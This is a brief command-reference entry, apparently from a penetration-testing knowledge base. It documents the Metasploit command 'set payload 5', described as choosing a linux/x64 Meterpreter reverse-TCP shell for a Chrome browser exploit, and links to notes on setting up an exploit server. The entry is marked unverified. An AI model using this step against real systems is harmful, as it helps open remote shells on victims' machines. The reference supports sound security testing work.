---
data: set payload 5
tags:
  - metasploit
  - payload
type: command
output: Payload set
executor: msfconsole
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.163Z'
id: cfa20a76-49e7-4e93-acdd-7db39777eab9
verified: false
validated: true
submitted: true
---
# msf-set-payload-5

## Command

```msf
set payload 5
```

## Description

Sets the payload index to 5 (linux/x64/meterpreter/reverse_tcp) for reverse shell in the Chrome exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | 5 for specific Meterpreter | Yes |

## Examples

### Basic Usage

```msf
set payload 5
```

## Expected Output

'Payload => 5 (linux/x64/meterpreter/reverse_tcp)'.

## Related

- [[commands/msf-set-lhost-ip]]
- [[procedures/Set-Up-Metasploit-Exploit-Server-for-Browser-RCE]]
